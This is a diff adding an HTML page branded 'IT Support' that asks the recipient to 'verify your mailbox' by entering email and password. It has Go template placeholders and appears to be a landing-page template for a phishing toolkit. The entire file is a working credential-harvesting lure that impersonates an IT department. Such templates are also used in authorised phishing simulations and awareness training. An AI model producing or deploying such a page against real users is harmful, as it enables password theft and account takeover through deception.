@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>IT Support — Verify account</title>
+  <style>
+    body { font-family: Segoe UI, Arial, sans-serif; background:#f4f6f8; margin:0; }
+    .box { max-width:420px; margin:60px auto; background:#fff; padding:28px;
+           border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,.08); }
+    h1 { font-size:20px; margin:0 0 8px; color:#0b5cab; }
+    p { color:#444; }
+    label { display:block; font-size:13px; margin-top:12px; }
+    input { width:100%; padding:10px; margin-top:4px; box-sizing:border-box; border:1px solid #ccc; border-radius:4px; }
+    button { width:100%; margin-top:18px; padding:12px; background:#0b5cab; color:#fff; border:0; border-radius:4px; cursor:pointer; font-size:15px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>IT Support</h1>
+    <p>Verify your mailbox to keep access to {{.Email}}.</p>
+    <form method="POST" action="">
+      <label>Email</label>
+      <input type="email" name="email" value="{{.Email}}" required>
+      <label>Password</label>
+      <input type="password" name="password" required>
+      <button type="submit">Verify</button>
+    </form>
+  </div>
+</body>
+</html>
